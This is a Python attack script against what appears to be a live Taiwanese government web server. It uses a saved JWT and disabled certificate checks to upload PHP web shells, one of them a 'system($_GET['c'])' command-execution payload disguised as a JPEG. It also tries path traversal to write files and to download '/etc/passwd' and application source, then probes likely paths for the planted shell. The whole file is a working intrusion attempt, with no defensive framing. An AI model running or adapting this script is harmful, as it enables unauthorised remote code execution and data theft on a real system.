import requests, urllib3
urllib3.disable_warnings()

base = "https://tpertc.tfd.gov.tw"
token = open("/mnt/c/Users/Administrator/Desktop/JySecAI/erpc/data/femet_jwt.txt").read().strip()

# Try uploading with path traversal in fname
# The app uploads to /rtc/api/file.php?action=save_blob
# fname is the filename parameter

# Try to write to known locations
test_content = "<?php echo 'test'; ?>"
files = {
    "fname": "test_shell.php",
    "attachment": ("test_shell.php", test_content, "application/octet-stream"),
}
r = requests.post(f"{base}/rtc/api/file.php?action=save_blob",
    files=files, verify=False, timeout=10)
print(f"Upload PHP: {r.status_code} {r.text[:100]}")

# Try with JWT auth
headers = {"Authorization": f"Bearer {token}"}
files = {
    "fname": "test_shell2.php",
    "attachment": ("test_shell2.php", test_content, "application/x-php"),
}
r = requests.post(f"{base}/rtc/api/file.php?action=save_blob",
    files=files, headers=headers, verify=False, timeout=10)
print(f"Upload PHP (JWT): {r.status_code} {r.text[:100]}")

# Try path traversal in fname
for fname in ["../../../client/test_shell.php", "../test_shell.php", "../../test_shell.php", "/test_shell.php", "test_shell.php"]:
    files = {
        "fname": fname,
        "attachment": ("test_shell.php", test_content, "application/x-php"),
    }
    r = requests.post(f"{base}/rtc/api/file.php?action=save_blob",
        files=files, verify=False, timeout=10)
    print(f"Upload '{fname}': {r.status_code} {r.text[:100]}")

# Try to download with path traversal
for fname in ["../../index.php", "../../rtc/api/index.php", "../../../etc/passwd", "test_shell.php"]:
    r = requests.get(f"{base}/rtc/api/file.php?action=download&fname={fname}",
        verify=False, timeout=10)
    print(f"Download '{fname}': {r.status_code} {r.text[:200]}")

# Try save_jpeg with different content types
files = {
    "fname": "test.jpg",
    "attachment": ("test.jpg", b"<?php system($_GET['c']); ?>", "image/jpeg"),
}
r = requests.post(f"{base}/rtc/api/file.php?action=save_jpeg",
    files=files, verify=False, timeout=10)
print(f"\nUpload JPEG: {r.status_code} {r.text[:100]}")

# Try to access uploaded files
for path in ["/test_shell.php", "/test.jpg", "/rtc/test_shell.php", "/rtc/uploads/test_shell.php",
             "/uploads/test_shell.php", "/rtc/data/test_shell.php", "/static/test_shell.php",
             "/rtc/api/uploads/test_shell.php"]:
    r = requests.get(f"{base}{path}", verify=False, timeout=5)
    print(f"GET {path}: {r.status_code} {r.text[:100]}")

# Try different file.php actions
for action in ["getfile", "read", "fetch", "load", "retrieve", "show", "view", "open"]:
    r = requests.get(f"{base}/rtc/api/file.php?action={action}&fname=test.jpg", verify=False, timeout=8)
    print(f"file.php?action={action}: {r.status_code} {r.text[:100]}")

print("\nDone")
